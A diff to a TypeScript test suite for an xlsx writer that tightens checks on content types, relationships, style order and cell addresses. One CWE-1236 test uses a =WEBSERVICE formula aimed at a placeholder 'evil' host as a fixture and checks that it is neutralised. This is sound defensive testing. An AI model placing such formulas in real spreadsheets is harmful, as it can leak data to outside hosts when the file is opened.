@@ -178,35 +178,40 @@ describe('featureMatrixToXlsx — native zero-dep xlsx (STORE zip + inline-strin
     expect(entries.has('xl/styles.xml')).toBe(true)
   })
 
-  it('declares Content-Type overrides for workbook/worksheet/styles', async () => {
+  it('declares Content-Type overrides for workbook/worksheet/styles (paired, not swapped)', async () => {
     const ct = extractZipEntries(await featureMatrixToXlsx([row({})]))
       .get('[Content_Types].xml')
       ?.toString('utf8') ?? ''
-    expect(ct).toContain('/xl/workbook.xml')
-    expect(ct).toContain('spreadsheetml.sheet.main+xml')
-    expect(ct).toContain('/xl/worksheets/sheet1.xml')
-    expect(ct).toContain('spreadsheetml.worksheet+xml')
-    expect(ct).toContain('/xl/styles.xml')
-    expect(ct).toContain('spreadsheetml.styles+xml')
+    // Each Override must pair its PartName with the correct ContentType — a swapped-type
+    // workbook (workbook.xml→worksheet+xml) would pass free-floating `toContain` checks but
+    // be rejected by Excel. Assert each <Override/> as a unit.
+    expect(ct).toMatch(/<Override PartName="\/xl\/workbook\.xml" ContentType="application\/vnd\.openxmlformats-officedocument\.spreadsheetml\.sheet\.main\+xml"\/>/)
+    expect(ct).toMatch(/<Override PartName="\/xl\/worksheets\/sheet1\.xml" ContentType="application\/vnd\.openxmlformats-officedocument\.spreadsheetml\.worksheet\+xml"\/>/)
+    expect(ct).toMatch(/<Override PartName="\/xl\/styles\.xml" ContentType="application\/vnd\.openxmlformats-officedocument\.spreadsheetml\.styles\+xml"\/>/)
   })
 
-  it('wires workbook.xml.rels rId1→sheet1 and rId2→styles', async () => {
-    const rels = extractZipEntries(await featureMatrixToXlsx([row({})]))
-      .get('xl/_rels/workbook.xml.rels')
-      ?.toString('utf8') ?? ''
-    expect(rels).toMatch(/Id="rId1"[^>]*Target="worksheets\/sheet1.xml"/)
-    expect(rels).toMatch(/Id="rId2"[^>]*Target="styles.xml"/)
+  it('wires workbook.xml <sheet r:id> → rels → sheet1 end-to-end', async () => {
+    const entries = extractZipEntries(await featureMatrixToXlsx([row({})]))
+    const wb = entries.get('xl/workbook.xml')?.toString('utf8') ?? ''
+    const rels = entries.get('xl/_rels/workbook.xml.rels')?.toString('utf8') ?? ''
+    // The workbook's sheet references rId1, and rId1 in the rels must target the worksheet.
+    expect(wb).toMatch(/<sheet[^>]*r:id="rId1"/)
+    expect(rels).toMatch(/Id="rId1"[^>]*Type="[^"]*\/worksheet"[^>]*Target="worksheets\/sheet1\.xml"/)
+    expect(rels).toMatch(/Id="rId2"[^>]*Type="[^"]*\/styles"[^>]*Target="styles\.xml"/)
   })
 
-  it('styles.xml defines a bold cellXf at index 1 (header parity)', async () => {
+  it('styles.xml defines a bold cellXf at index 1 (header parity, index order verified)', async () => {
     const styles = extractZipEntries(await featureMatrixToXlsx([row({})]))
       .get('xl/styles.xml')
       ?.toString('utf8') ?? ''
-    // A bold <font> exists.
+    // A bold <font> exists at font index 1.
     expect(styles).toMatch(/<font><b\/>/)
-    // cellXfs has >=2 entries and index 1 applies the bold font (fontId="1" applyFont="1").
-    expect(styles).toMatch(/<cellXfs count="2">/)
-    expect(styles).toMatch(/<xf[^>]*fontId="1"[^>]*applyFont="1"/)
+    // cellXfs must have exactly 2 entries in order: index 0 = default (fontId 0),
+    // index 1 = bold (fontId 1, applyFont 1). A writer that puts the bold xf first (index 0)
+    // would make `s="1"` resolve to the non-bold style — assert the ORDER, not just existence.
+    expect(styles).toMatch(
+      /<cellXfs count="2">\s*<xf[^>]*fontId="0"[^>]*>\s*<xf[^>]*fontId="1"[^>]*applyFont="1"/,
+    )
   })
 
   it('emits a <dimension> and <cols> with the 10 column widths', async () => {
@@ -246,17 +251,19 @@ describe('featureMatrixToXlsx — native zero-dep xlsx (STORE zip + inline-strin
     }
   })
 
-  it('CWE-1236: neutralizes a =WEBSERVICE() note with a leading quote (literal " preserved)', async () => {
+  it('CWE-1236: neutralizes a =WEBSERVICE() note (J2) with a leading quote (literal " preserved)', async () => {
     // `"` is intentionally literal in XML text content — xmlEscape must NOT escape it
     // (it is only special inside attribute values; the only attribute here is r="...", which
-    // is alphanumeric). This assertion is a contract, not an accident.
+    // is alphanumeric). This assertion is a contract, not an accident. Address-bound to J2
+    // (note is the 10th column) so a column-swap bug cannot false-pass.
     const xml = sheetXml(await featureMatrixToXlsx([row({ note: '=WEBSERVICE("http://evil/x")' })]))
-    expect(xml).toContain(`<t xml:space="preserve">'=WEBSERVICE("http://evil/x")</t>`)
+    expect(xml).toMatch(/<c r="J2" t="inlineStr">[\s\S]*?<t xml:space="preserve">'=WEBSERVICE\("http:\/\/evil\/x"\)<\/t>/)
   })
 
-  it('CWE-1236: leaves a benign capability cell untouched', async () => {
+  it('CWE-1236: leaves a benign capability cell (B2) untouched', async () => {
+    // Address-bound to B2 (capability is the 2nd column) so a column-swap bug cannot false-pass.
     const xml = sheetXml(await featureMatrixToXlsx([row({ capability: 'Static analysis' })]))
-    expect(xml).toContain(`<t xml:space="preserve">Static analysis</t>`)
+    expect(xml).toMatch(/<c r="B2" t="inlineStr">[\s\S]*?<t xml:space="preserve">Static analysis<\/t>/)
   })
 
   it('emits an empty kitDims cell (not omitted) — preserves exceljs "" parity', async () => {
